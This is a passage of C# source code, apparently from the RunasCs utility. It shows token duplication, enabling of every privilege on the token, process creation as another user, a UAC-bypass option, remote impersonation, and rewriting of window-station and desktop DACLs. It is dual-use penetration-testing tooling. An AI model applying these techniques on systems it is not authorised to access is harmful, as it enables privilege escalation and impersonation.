            Console.Out.WriteLine(String.Format("[*] Warning: Logon for user '{0}' is limited. Use the --logon-type value '{1}' to obtain a more privileged token", username, logonTypeNotFiltered));
        // Enable SeImpersonatePrivilege on our current process needed by the seclogon to make the CreateProcessWithTokenW call
        AccessToken.EnablePrivilege("SeImpersonatePrivilege", WindowsIdentity.GetCurrent().Token);
        // Enable all privileges for the token of the new process
        AccessToken.EnableAllPrivileges(hTokenDuplicate);
        if (!CreateProcessWithTokenW(hTokenDuplicate, logonFlags, null, commandLine, CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, out processInfo))
            throw new RunasCsException("CreateProcessWithTokenW", true);
        CloseHandle(hToken);
        CloseHandle(hTokenDuplicate);
    }

    private void RunasCreateProcessAsUserW(string username, string domainName, string password, int logonType, int logonProvider, string commandLine, bool forceUserProfileCreation, bool userProfileExists, ref STARTUPINFO startupInfo, ref ProcessInformation processInfo, ref int logonTypeNotFiltered) {
        IntPtr hToken = IntPtr.Zero;
        IntPtr hTokenDuplicate = IntPtr.Zero;
        IntPtr lpEnvironment = IntPtr.Zero;
        if (!LogonUser(username, domainName, password, logonType, logonProvider, ref hToken))
            throw new RunasCsException("LogonUser", true);
        if (!DuplicateTokenEx(hToken, AccessToken.TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TokenPrimary, ref hTokenDuplicate))
            throw new RunasCsException("DuplicateTokenEx", true);
        if (IsLimitedUserLogon(hTokenDuplicate, username, domainName, password, out logonTypeNotFiltered))
            Console.Out.WriteLine(String.Format("[*] Warning: Logon for user '{0}' is limited. Use the --logon-type value '{1}' to obtain a more privileged token", username, logonTypeNotFiltered));
        GetUserEnvironmentBlock(hTokenDuplicate, username, forceUserProfileCreation, userProfileExists, out lpEnvironment);
        // Enable SeAssignPrimaryTokenPrivilege on our current process needed by the kernel to make the CreateProcessAsUserW call
        AccessToken.EnablePrivilege("SeAssignPrimaryTokenPrivilege", WindowsIdentity.GetCurrent().Token);
        // Enable all privileges for the token of the new process
        AccessToken.EnableAllPrivileges(hTokenDuplicate);
        //the inherit handle flag must be true otherwise the pipe handles won't be inherited and the output won't be retrieved
        if (!CreateProcessAsUser(hTokenDuplicate, null, commandLine, IntPtr.Zero, IntPtr.Zero, true, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, lpEnvironment, Environment.GetEnvironmentVariable("SystemRoot") + "\\System32", ref startupInfo, out processInfo))
            throw new RunasCsException("CreateProcessAsUser", true);
        if (lpEnvironment != IntPtr.Zero) DestroyEnvironmentBlock(lpEnvironment);
        CloseHandle(hToken);
        CloseHandle(hTokenDuplicate);
    }

    public RunasCs()
    {
        this.hOutputRead = new IntPtr(0);
        this.hOutputWrite = new IntPtr(0);
        this.hErrorWrite = new IntPtr(0);
        this.socket = new IntPtr(0);
        this.stationDaclObj = null;
        this.hTokenPreviousImpersonatingThread = new IntPtr(0);
    }

    public void CleanupHandles()
    {
        if(this.hOutputRead != IntPtr.Zero) CloseHandle(this.hOutputRead);
        if(this.hOutputWrite != IntPtr.Zero) CloseHandle(this.hOutputWrite);
        if(this.hErrorWrite != IntPtr.Zero) CloseHandle(this.hErrorWrite);
        if(this.socket != IntPtr.Zero) closesocket(this.socket);
        if(this.stationDaclObj != null) this.stationDaclObj.CleanupHandles();
        this.hOutputRead = IntPtr.Zero;
        this.hOutputWrite = IntPtr.Zero;
        this.hErrorWrite = IntPtr.Zero;
        this.socket = IntPtr.Zero;
        this.hTokenPreviousImpersonatingThread = IntPtr.Zero;
        this.stationDaclObj = null;
    }

    public string RunAs(string username, string password, string cmd, string domainName, uint processTimeout, int logonType, int createProcessFunction, string[] remote, bool forceUserProfileCreation, bool bypassUac, bool remoteImpersonation)
    /*
        int createProcessFunction:
            0: CreateProcessAsUserW();
            1: CreateProcessWithTokenW();
            2: CreateProcessWithLogonW();
    */
    {
        string commandLine = ParseCommonProcessesInCommandline(cmd);
        int logonProvider = LOGON32_PROVIDER_DEFAULT;
        int logonTypeNotFiltered = 0;
        STARTUPINFO startupInfo = new STARTUPINFO();
        startupInfo.cb = Marshal.SizeOf(startupInfo);
        startupInfo.lpReserved = null;
        ProcessInformation processInfo = new ProcessInformation();
        // setup the std handles for the process based on the user input
        RunasSetupStdHandlesForProcess(processTimeout, remote, ref startupInfo, out this.hOutputWrite, out this.hErrorWrite, out this.hOutputRead, out socket);
        // add the proper DACL on the window station and desktop that will be used
        this.stationDaclObj = new WindowStationDACL();
        string desktopName = this.stationDaclObj.AddAclToActiveWindowStation(domainName, username, logonType);
        startupInfo.lpDesktop = desktopName;
        // setup proper logon provider for new credentials (9) logons
        if (logonType == LOGON32_LOGON_NEW_CREDENTIALS) {
            logonProvider = LOGON32_PROVIDER_WINNT50;
            if (domainName == "") // fixing bugs in seclogon when using LOGON32_LOGON_NEW_CREDENTIALS...
                domainName = ".";
        } 
        // we check if the user has been granted the logon type requested, if not we show a message suggesting which logon type can be used to succesfully logon
        CheckAvailableUserLogonType(username, password, domainName, logonType, logonProvider);
        // Use the proper CreateProcess* function
        if (remoteImpersonation)
            RunasRemoteImpersonation(username, domainName, password, logonType, logonProvider, commandLine, ref startupInfo, ref processInfo, ref logonTypeNotFiltered);
        else {
            bool userProfileExists;
            uint logonFlags = 0;
            userProfileExists = IsUserProfileCreated(username, password, domainName, logonType);
            // we load the user profile only if it has been already created or the creation is forced from the flag --force-profile
            if (userProfileExists || forceUserProfileCreation)
                logonFlags = LOGON_WITH_PROFILE;
            if (logonType != LOGON32_LOGON_NEW_CREDENTIALS && !forceUserProfileCreation && !userProfileExists)
                Console.Out.WriteLine("[*] Warning: User profile directory for user " + username + " does not exists. Use --force-profile if you want to force the creation.");
            if (createProcessFunction == 2)
                RunasCreateProcessWithLogonW(username, domainName, password, logonType, logonFlags, commandLine, bypassUac, ref startupInfo, ref processInfo, ref logonTypeNotFiltered);
            else
            {
                if (bypassUac)
                    throw new RunasCsException(String.Format("The flag --bypass-uac is not compatible with {0} but only with --function '2' (CreateProcessWithLogonW)", GetProcessFunction(createProcessFunction)));
                if (createProcessFunction == 0)
                    RunasCreateProcessAsUserW(username, domainName, password, logonType, logonProvider, commandLine, forceUserProfileCreation, userProfileExists, ref startupInfo, ref processInfo, ref logonTypeNotFiltered);
                else if (createProcessFunction == 1)
                    RunasCreateProcessWithTokenW(username, domainName, password, commandLine, logonType, logonFlags, logonProvider, ref startupInfo, ref processInfo, ref logonTypeNotFiltered);
            }
        }
        Console.Out.Flush();  // flushing console before waiting for child process execution
        string output = "";
        if (processTimeout > 0) {
            CloseHandle(this.hOutputWrite);
            CloseHandle(this.hErrorWrite);
            this.hOutputWrite = IntPtr.Zero;
            this.hErrorWrite = IntPtr.Zero;
            WaitForSingleObject(processInfo.process, processTimeout);
            output += "\r\n" + ReadOutputFromPipe(this.hOutputRead);
        } else {
            int sessionId = System.Diagnostics.Process.GetCurrentProcess().SessionId;
            if (remoteImpersonation)
                output += "\r\n[+] Running in session " + sessionId.ToString() + " with process function 'Remote Impersonation' \r\n";
            else
                output += "\r\n[+] Running in session " + sessionId.ToString() + " with process function " + GetProcessFunction(createProcessFunction) + "\r\n";
            output += "[+] Using Station\\Desktop: " + desktopName + "\r\n";
            output += "[+] Async process '" + commandLine + "' with pid " + processInfo.processId + " created in background.\r\n";
        }
        CloseHandle(processInfo.process);
        CloseHandle(processInfo.thread);
        this.CleanupHandles();
        return output;
    }
}

public class WindowStationDACL{
   
    private const int UOI_NAME = 2;
    private const int ERROR_INSUFFICIENT_BUFFER = 122;
    private const uint SECURITY_DESCRIPTOR_REVISION = 1;
    private const uint ACL_REVISION = 2;
    private const uint MAXDWORD = 0xffffffff;
    private const byte ACCESS_ALLOWED_ACE_TYPE = 0x0;
    private const byte CONTAINER_INHERIT_ACE = 0x2;
    private const byte INHERIT_ONLY_ACE = 0x8;
    private const byte OBJECT_INHERIT_ACE = 0x1;
    private const byte NO_PROPAGATE_INHERIT_ACE = 0x4;
    private const int NO_ERROR = 0;
    private const int ERROR_INVALID_FLAGS = 1004; // On Windows Server 2003 this error is/can be returned, but processing can still continue
    
    [Flags]
    private enum ACCESS_MASK : uint
    {
        DELETE = 0x00010000,
        READ_CONTROL = 0x00020000,
        WRITE_DAC = 0x00040000,
        WRITE_OWNER = 0x00080000,
        SYNCHRONIZE = 0x00100000,

        STANDARD_RIGHTS_REQUIRED = 0x000F0000,

        STANDARD_RIGHTS_READ = 0x00020000,
        STANDARD_RIGHTS_WRITE = 0x00020000,
        STANDARD_RIGHTS_EXECUTE = 0x00020000,

        STANDARD_RIGHTS_ALL = 0x001F0000,

        SPECIFIC_RIGHTS_ALL = 0x0000FFFF,

        ACCESS_SYSTEM_SECURITY = 0x01000000,

        MAXIMUM_ALLOWED = 0x02000000,

        GENERIC_READ = 0x80000000,
        GENERIC_WRITE = 0x40000000,
        GENERIC_EXECUTE = 0x20000000,
        GENERIC_ALL = 0x10000000,
        GENERIC_ACCESS = GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE | GENERIC_ALL,

        DESKTOP_READOBJECTS = 0x00000001,
        DESKTOP_CREATEWINDOW = 0x00000002,
        DESKTOP_CREATEMENU = 0x00000004,
        DESKTOP_HOOKCONTROL = 0x00000008,
        DESKTOP_JOURNALRECORD = 0x00000010,
        DESKTOP_JOURNALPLAYBACK = 0x00000020,
        DESKTOP_ENUMERATE = 0x00000040,
        DESKTOP_WRITEOBJECTS = 0x00000080,
        DESKTOP_SWITCHDESKTOP = 0x00000100,
        DESKTOP_ALL = (DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU |
                    DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
                    DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP |
                    STANDARD_RIGHTS_REQUIRED),

        WINSTA_ENUMDESKTOPS = 0x00000001,
        WINSTA_READATTRIBUTES = 0x00000002,
        WINSTA_ACCESSCLIPBOARD = 0x00000004,
        WINSTA_CREATEDESKTOP = 0x00000008,
        WINSTA_WRITEATTRIBUTES = 0x00000010,
        WINSTA_ACCESSGLOBALATOMS = 0x00000020,
        WINSTA_EXITWINDOWS = 0x00000040,
        WINSTA_ENUMERATE = 0x00000100,
        WINSTA_READSCREEN = 0x00000200,
        WINSTA_ALL =  (WINSTA_ACCESSCLIPBOARD  | WINSTA_ACCESSGLOBALATOMS | 
                   WINSTA_CREATEDESKTOP    | WINSTA_ENUMDESKTOPS      | 
                   WINSTA_ENUMERATE        | WINSTA_EXITWINDOWS       | 
                   WINSTA_READATTRIBUTES   | WINSTA_READSCREEN        | 
                   WINSTA_WRITEATTRIBUTES  | DELETE                   | 
                   READ_CONTROL            | WRITE_DAC                | 
                   WRITE_OWNER)
    }
    
    [Flags] 
    private enum SECURITY_INFORMATION : uint
    {
        OWNER_SECURITY_INFORMATION        = 0x00000001,
        GROUP_SECURITY_INFORMATION        = 0x00000002,
        DACL_SECURITY_INFORMATION         = 0x00000004,
        SACL_SECURITY_INFORMATION         = 0x00000008,
        UNPROTECTED_SACL_SECURITY_INFORMATION = 0x10000000,
        UNPROTECTED_DACL_SECURITY_INFORMATION = 0x20000000,
        PROTECTED_SACL_SECURITY_INFORMATION   = 0x40000000,
        PROTECTED_DACL_SECURITY_INFORMATION   = 0x80000000
    }
    
    private enum ACL_INFORMATION_CLASS
    {
        AclRevisionInformation = 1,
        AclSizeInformation = 2
    }
    
    private enum SID_NAME_USE
    {
        SidTypeUser = 1,
        SidTypeGroup,
        SidTypeDomain,
        SidTypeAlias,
        SidTypeWellKnownGroup,
        SidTypeDeletedAccount,
        SidTypeInvalid,
        SidTypeUnknown,
        SidTypeComputer
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct SidIdentifierAuthority
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6, ArraySubType = UnmanagedType.I1)]
        public byte[] Value;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct ACL_SIZE_INFORMATION
    {
        public uint AceCount;
        public uint AclBytesInUse;
        public uint AclBytesFree;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct ACE_HEADER
    {
        public byte AceType;
        public byte AceFlags;
        public short AceSize;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct ACCESS_ALLOWED_ACE
    {
        public ACE_HEADER Header;
        public ACCESS_MASK Mask;
        public uint SidStart;
    }
    
    [DllImport("user32", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr GetProcessWindowStation();

    [DllImport("user32.dll", SetLastError=true)]
    private static extern bool GetUserObjectInformation(IntPtr hObj, int nIndex,[Out] byte [] pvInfo, uint nLength, out uint lpnLengthNeeded);

    [DllImport("user32", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr OpenWindowStation([MarshalAs(UnmanagedType.LPTStr)] string lpszWinSta,[MarshalAs(UnmanagedType.Bool)]bool fInherit, ACCESS_MASK dwDesiredAccess);
    
    [DllImport("user32.dll")]
    private static extern IntPtr OpenDesktop(string lpszDesktop, uint dwFlags, bool fInherit, ACCESS_MASK dwDesiredAccess);
    
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern bool CloseWindowStation(IntPtr hWinsta);
    
    [DllImport("user32.dll", SetLastError=true)]
    private static extern bool CloseDesktop(IntPtr hDesktop);
    
    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool SetProcessWindowStation(IntPtr hWinSta);
 
    [DllImport("advapi32.dll")]
    private static extern IntPtr FreeSid(IntPtr pSid);
    
    [DllImport("user32.dll", SetLastError = true)]
	private static extern bool GetUserObjectSecurity(IntPtr hObj, ref SECURITY_INFORMATION pSIRequested, IntPtr pSID, uint nLength, out uint lpnLengthNeeded);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool GetSecurityDescriptorDacl(IntPtr pSecurityDescriptor, [MarshalAs(UnmanagedType.Bool)] out bool bDaclPresent, ref IntPtr pDacl,[MarshalAs(UnmanagedType.Bool)] out bool bDaclDefaulted);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool GetAclInformation(IntPtr pAcl, ref ACL_SIZE_INFORMATION pAclInformation, uint nAclInformationLength, ACL_INFORMATION_CLASS dwAclInformationClass);

    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool InitializeSecurityDescriptor(IntPtr SecurityDescriptor, uint dwRevision);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int GetLengthSid(IntPtr pSID);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool InitializeAcl(IntPtr pAcl, uint nAclLength, uint dwAclRevision);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetAce(IntPtr aclPtr, int aceIndex, out IntPtr acePtr);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool AddAce(IntPtr pAcl, uint dwAceRevision, uint dwStartingAceIndex, IntPtr pAceList, uint nAceListLength);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool AddAccessAllowedAce(IntPtr pAcl, uint dwAceRevision, ACCESS_MASK AccessMask, IntPtr pSid);
    
    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool SetSecurityDescriptorDacl(IntPtr sd, bool daclPresent, IntPtr dacl, bool daclDefaulted);
    
    [DllImport("user32.dll", SetLastError = true)]
	private static extern bool SetUserObjectSecurity(IntPtr hObj, ref SECURITY_INFORMATION pSIRequested, IntPtr pSD);

    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool CopySid(uint nDestinationSidLength, IntPtr pDestinationSid, IntPtr pSourceSid);
    
    [DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError = true)]
    private static extern bool LookupAccountName(string lpSystemName, string lpAccountName, [MarshalAs(UnmanagedType.LPArray)] byte[] Sid, ref uint cbSid, StringBuilder ReferencedDomainName, ref uint cchReferencedDomainName, out SID_NAME_USE peUse);
    
    private IntPtr hWinsta;
    private IntPtr hDesktop;
    private IntPtr userSid;
    
    private IntPtr GetUserSid(string domain, string username){
        IntPtr userSid = IntPtr.Zero;
        string fqan = "";//Fully qualified account names
        byte [] Sid = null;
        uint cbSid = 0;
        StringBuilder referencedDomainName = new StringBuilder();
        uint cchReferencedDomainName = (uint)referencedDomainName.Capacity;
        SID_NAME_USE sidUse;
        int err = NO_ERROR;
        
        if(domain != "" && domain != ".")
            fqan = domain + "\\" + username;
        else
            fqan = username;
        
        if (!LookupAccountName(null,fqan,Sid,ref cbSid,referencedDomainName,ref cchReferencedDomainName,out sidUse))
        {
            err = Marshal.GetLastWin32Error();
            if (err == ERROR_INSUFFICIENT_BUFFER || err == ERROR_INVALID_FLAGS)
            {
                Sid = new byte[cbSid];
                referencedDomainName.EnsureCapacity((int)cchReferencedDomainName);
                err = NO_ERROR;
                if (!LookupAccountName(null,fqan,Sid,ref cbSid,referencedDomainName,ref cchReferencedDomainName,out sidUse))
                    err = Marshal.GetLastWin32Error();
            }
        }
        else{
            string error = "The username " + fqan + " has not been found. ";
            throw new RunasCsException(error + "LookupAccountName", true);
        }
        if (err == 0)
        {
            userSid = Marshal.AllocHGlobal((int)cbSid);
            Marshal.Copy(Sid, 0, userSid, (int)cbSid);
        }
        else{
            string error = "The username " + fqan + " has not been found. ";
            throw new RunasCsException(error + "LookupAccountName", true);
        }
        return userSid;
    }
    
    //Big thanks to Vanara project
    //https://github.com/dahall/Vanara/blob/9771eadebc874cfe876011c9d6588aefb62626d9/PInvoke/Security/AdvApi32/SecurityBaseApi.cs#L4656
    private void AddAllowedAceToDACL(IntPtr pDacl, ACCESS_MASK mask, byte aceFlags, uint aceSize){
        int offset = Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) - Marshal.SizeOf(typeof(uint));
        ACE_HEADER AceHeader = new ACE_HEADER();
        AceHeader.AceType = ACCESS_ALLOWED_ACE_TYPE;
        AceHeader.AceFlags = aceFlags;
        AceHeader.AceSize = (short)aceSize;
        IntPtr pNewAcePtr = Marshal.AllocHGlobal((int)aceSize);
        ACCESS_ALLOWED_ACE pNewAceStruct = new ACCESS_ALLOWED_ACE();
        pNewAceStruct.Header = AceHeader;
        pNewAceStruct.Mask = mask;
        Marshal.StructureToPtr(pNewAceStruct, pNewAcePtr, false);
        IntPtr sidStartPtr = new IntPtr(pNewAcePtr.ToInt64() + offset);
        if (!CopySid((uint)GetLengthSid(this.userSid), sidStartPtr, this.userSid))
            throw new RunasCsException("CopySid", true);
        if (!AddAce(pDacl, ACL_REVISION, MAXDWORD, pNewAcePtr, aceSize))
            throw new RunasCsException("AddAce", true);
        Marshal.FreeHGlobal(pNewAcePtr);
    }

    private void AddAceToWindowStation(){
        uint cbSd = 0;
        bool fDaclPresent = false;
        bool fDaclExist = false;
        IntPtr pDacl = IntPtr.Zero;
        uint cbDacl = 0;
        IntPtr pSd = IntPtr.Zero;
        IntPtr pNewSd = IntPtr.Zero;
        uint cbNewDacl = 0;
        uint cbNewAce = 0;
        IntPtr pNewDacl = IntPtr.Zero;
        
        ACL_SIZE_INFORMATION aclSizeInfo = new ACL_SIZE_INFORMATION();
        SECURITY_INFORMATION si = SECURITY_INFORMATION.DACL_SECURITY_INFORMATION;
        // Get required buffer size and allocate the SECURITY_DESCRIPTOR buffer.
        if (!GetUserObjectSecurity(this.hWinsta, ref si, pSd, 0, out cbSd))
        {
            if (Marshal.GetLastWin32Error() != ERROR_INSUFFICIENT_BUFFER)
            {
                throw new RunasCsException("GetUserObjectSecurity 1 size", true);
            }
        }
        pSd = Marshal.AllocHGlobal((int)cbSd);
        // Obtain the security descriptor for the desktop object.
        if (!GetUserObjectSecurity(this.hWinsta, ref si, pSd, cbSd, out cbSd))
        {
            throw new RunasCsException("GetUserObjectSecurity 2", true);
        }
        // Get the DACL from the security descriptor.
        if (!GetSecurityDescriptorDacl(pSd, out fDaclPresent, ref pDacl, out fDaclExist))
        {
            throw new RunasCsException("GetSecurityDescriptorDacl", true);
        }
        // Get the size information of the DACL.
        if (pDacl == IntPtr.Zero)
        {
            cbDacl = 0;
        }
        else
        {
            if (!GetAclInformation(pDacl, ref aclSizeInfo, (uint)Marshal.SizeOf(typeof(ACL_SIZE_INFORMATION)), ACL_INFORMATION_CLASS.AclSizeInformation))
            {
                throw new RunasCsException("GetAclInformation", true);
            }
            cbDacl = aclSizeInfo.AclBytesInUse;
        }
        
        // Allocate memory for the new security descriptor.
        pNewSd = Marshal.AllocHGlobal((int)cbSd);
        // Initialize the new security descriptor.
        if (!InitializeSecurityDescriptor(pNewSd, SECURITY_DESCRIPTOR_REVISION))
        {
            throw new RunasCsException("InitializeSecurityDescriptor", true);
        }
        
        // Compute the size of a DACL to be added to the new security descriptor.
        cbNewAce = (uint)Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) + (uint)GetLengthSid(this.userSid) - (uint)Marshal.SizeOf(typeof(uint));
        if(cbDacl == 0)
            cbNewDacl =  8 + (cbNewAce*2);//8 = sizeof(ACL)
        else
            cbNewDacl = cbDacl + (cbNewAce*2);

        // Allocate memory for the new DACL.
        pNewDacl = Marshal.AllocHGlobal((int)cbNewDacl);
        // Initialize the new DACL.
        if (!InitializeAcl(pNewDacl, cbNewDacl, ACL_REVISION))
        {
            throw new RunasCsException("InitializeAcl", true);
        }
        
        // If the original DACL is present, copy it to the new DACL.
        if (fDaclPresent)
        {
            // Copy the ACEs to the new DACL.
            for (int dwIndex = 0; dwIndex < aclSizeInfo.AceCount; dwIndex++)
            {
                IntPtr pTempAce = IntPtr.Zero;
                // Get an ACE.
                if (!GetAce(pDacl, dwIndex, out pTempAce))
                {
                    throw new RunasCsException("GetAce", true);
                }
                ACE_HEADER pTempAceStruct = (ACE_HEADER)Marshal.PtrToStructure(pTempAce, typeof(ACE_HEADER));
                // Add the ACE to the new ACL.
                if (!AddAce(pNewDacl, ACL_REVISION, MAXDWORD, pTempAce, (uint)pTempAceStruct.AceSize))
                {
                    throw new RunasCsException("AddAce", true);
                }
            }
        }
        
        AddAllowedAceToDACL(pNewDacl, ACCESS_MASK.GENERIC_ACCESS, CONTAINER_INHERIT_ACE | INHERIT_ONLY_ACE | OBJECT_INHERIT_ACE, cbNewAce);
        AddAllowedAceToDACL(pNewDacl, ACCESS_MASK.WINSTA_ALL, NO_PROPAGATE_INHERIT_ACE, cbNewAce);
        // Assign the new DACL to the new security descriptor.
        if (!SetSecurityDescriptorDacl(pNewSd, true, pNewDacl, false))
        {
            throw new RunasCsException("SetSecurityDescriptorDacl", true);
        }
        //  Set the new security descriptor for the desktop object.
        if (!SetUserObjectSecurity(this.hWinsta, ref si, pNewSd))
        {
            throw new RunasCsException("SetUserObjectSecurity", true);
        }
        
        Marshal.FreeHGlobal(pSd);
        Marshal.FreeHGlobal(pNewSd);
        Marshal.FreeHGlobal(pNewDacl);
    }

    private void AddAceToDesktop(){
        uint cbSd = 0;
        bool fDaclPresent = false;
        bool fDaclExist = false;
        IntPtr pDacl = IntPtr.Zero;
        uint cbDacl = 0;
        IntPtr pSd = IntPtr.Zero;
        IntPtr pNewSd = IntPtr.Zero;
        uint cbNewDacl = 0;
        uint cbNewAce = 0;
        IntPtr pNewDacl = IntPtr.Zero;
        
        ACL_SIZE_INFORMATION aclSizeInfo = new ACL_SIZE_INFORMATION();
        SECURITY_INFORMATION si = SECURITY_INFORMATION.DACL_SECURITY_INFORMATION;
        // Get required buffer size and allocate the SECURITY_DESCRIPTOR buffer.
        if (!GetUserObjectSecurity(this.hDesktop, ref si, pSd, 0, out cbSd))
        {
            if (Marshal.GetLastWin32Error() != ERROR_INSUFFICIENT_BUFFER)
            {
                throw new RunasCsException("GetUserObjectSecurity 1 size", true);
            }
        }
        pSd = Marshal.AllocHGlobal((int)cbSd);
        // Obtain the security descriptor for the desktop object.
        if (!GetUserObjectSecurity(this.hDesktop, ref si, pSd, cbSd, out cbSd))
        {
            throw new RunasCsException("GetUserObjectSecurity 2", true);
        }
        // Get the DACL from the security descriptor.
        if (!GetSecurityDescriptorDacl(pSd, out fDaclPresent, ref pDacl, out fDaclExist))
        {
            throw new RunasCsException("GetSecurityDescriptorDacl", true);
        }
        // Get the size information of the DACL.
        if (pDacl == IntPtr.Zero)
        {
            cbDacl = 0;
        }
        else
        {
            if (!GetAclInformation(pDacl, ref aclSizeInfo, (uint)Marshal.SizeOf(typeof(ACL_SIZE_INFORMATION)), ACL_INFORMATION_CLASS.AclSizeInformation))
            {
                throw new RunasCsException("GetAclInformation", true);
            }
            cbDacl = aclSizeInfo.AclBytesInUse;
        }
        
        // Allocate memory for the new security descriptor.
        pNewSd = Marshal.AllocHGlobal((int)cbSd);
        // Initialize the new security descriptor.
        if (!InitializeSecurityDescriptor(pNewSd, SECURITY_DESCRIPTOR_REVISION))
        {
            throw new RunasCsException("InitializeSecurityDescriptor", true);
        }
        
        // Compute the size of a DACL to be added to the new security descriptor.
        cbNewAce = (uint)Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) + (uint)GetLengthSid(this.userSid) - (uint)Marshal.SizeOf(typeof(uint));
        if(cbDacl == 0)
            cbNewDacl =  8 + cbNewAce;//8 = sizeof(ACL)
        else
            cbNewDacl = cbDacl + cbNewAce;

        // Allocate memory for the new DACL.
        pNewDacl = Marshal.AllocHGlobal((int)cbNewDacl);
        // Initialize the new DACL.
        if (!InitializeAcl(pNewDacl, cbNewDacl, ACL_REVISION))
        {
            throw new RunasCsException("InitializeAcl", true);
        }
        
        // If the original DACL is present, copy it to the new DACL.
        if (fDaclPresent)
        {
            // Copy the ACEs to the new DACL.
            for (int dwIndex = 0; dwIndex < aclSizeInfo.AceCount; dwIndex++)
            {
                IntPtr pTempAce = IntPtr.Zero;
                // Get an ACE.
                if (!GetAce(pDacl, dwIndex, out pTempAce))
                {
                    throw new RunasCsException("GetAce", true);
                }
                ACE_HEADER pTempAceStruct = (ACE_HEADER)Marshal.PtrToStructure(pTempAce, typeof(ACE_HEADER));
                // Add the ACE to the new ACL.
                if (!AddAce(pNewDacl, ACL_REVISION, MAXDWORD, pTempAce, (uint)pTempAceStruct.AceSize))
                {
                    throw new RunasCsException("AddAce", true);
                }
            }
        }
        
        // Add a new ACE to the new DACL.
        if (!AddAccessAllowedAce(pNewDacl, ACL_REVISION, ACCESS_MASK.DESKTOP_ALL, this.userSid))
        {
            throw new RunasCsException("AddAccessAllowedAce", true);
        }
        
        // Assign the new DACL to the new security descriptor.
        if (!SetSecurityDescriptorDacl(pNewSd, true, pNewDacl, false))
        {
            throw new RunasCsException("SetSecurityDescriptorDacl", true);
        }
        //  Set the new security descriptor for the desktop object.
        if (!SetUserObjectSecurity(this.hDesktop, ref si, pNewSd))
        {
            throw new RunasCsException("SetUserObjectSecurity", true);
        }
        
        Marshal.FreeHGlobal(pSd);
        Marshal.FreeHGlobal(pNewSd);
        Marshal.FreeHGlobal(pNewDacl);
    }
    public WindowStationDACL()
    {
        this.hWinsta = IntPtr.Zero;
        this.hDesktop = IntPtr.Zero;
        this.userSid = IntPtr.Zero;
    }

    public string AddAclToActiveWindowStation(string domain, string username, int logonType){
        string lpDesktop = "";
        byte[] stationNameBytes = new byte[256];
        string stationName = "";
        uint lengthNeeded = 0;
        IntPtr hWinstaSave = GetProcessWindowStation();
        if(hWinstaSave == IntPtr.Zero)
        {
            throw new RunasCsException("GetProcessWindowStation", true);
        }
        if(!GetUserObjectInformation(hWinstaSave, UOI_NAME, stationNameBytes, 256, out lengthNeeded)){
            throw new RunasCsException("GetUserObjectInformation", true);
        }
        stationName = Encoding.Default.GetString(stationNameBytes).Substring(0, (int)lengthNeeded-1);
        // this should be avoided with the LOGON32_LOGON_NEW_CREDENTIALS logon type or some bug can happen in LookupAccountName()
        if (logonType != 9)
        {
            this.hWinsta = OpenWindowStation(stationName, false, ACCESS_MASK.READ_CONTROL | ACCESS_MASK.WRITE_DAC);
            if (this.hWinsta == IntPtr.Zero)
            {
                throw new RunasCsException("OpenWindowStation", true);
            }
            if (!SetProcessWindowStation(this.hWinsta))
            {
                throw new RunasCsException("SetProcessWindowStation hWinsta", true);
            }
            this.hDesktop = OpenDesktop("Default", 0, false, ACCESS_MASK.READ_CONTROL | ACCESS_MASK.WRITE_DAC | ACCESS_MASK.DESKTOP_WRITEOBJECTS | ACCESS_MASK.DESKTOP_READOBJECTS);
            if (!SetProcessWindowStation(hWinstaSave))
            {
                throw new RunasCsException("SetProcessWindowStation hWinstaSave", true);
            }
            if (this.hWinsta == IntPtr.Zero)
            {
                throw new RunasCsException("OpenDesktop", true);
            }
            this.userSid = GetUserSid(domain, username);
            AddAceToWindowStation();
            AddAceToDesktop();
        }
        lpDesktop = stationName + "\\Default";
        return lpDesktop;
    }
    
    public void CleanupHandles()
    {
        if(this.hWinsta != IntPtr.Zero) CloseWindowStation(this.hWinsta);
        if(this.hDesktop != IntPtr.Zero) CloseDesktop(this.hDesktop);
        if(this.userSid != IntPtr.Zero) FreeSid(this.userSid);
    }
}

public static class AccessToken{
    // Mandatory Label SIDs (integrity levels)
    private const int SECURITY_MANDATORY_UNTRUSTED_RID = 0;
    private const int SECURITY_MANDATORY_LOW_RID = 0x1000;
    private const int SECURITY_MANDATORY_MEDIUM_RID = 0x2000;
    private const int SECURITY_MANDATORY_HIGH_RID = 0x3000;
    private const int SECURITY_MANDATORY_SYSTEM_RID = 0x4000;
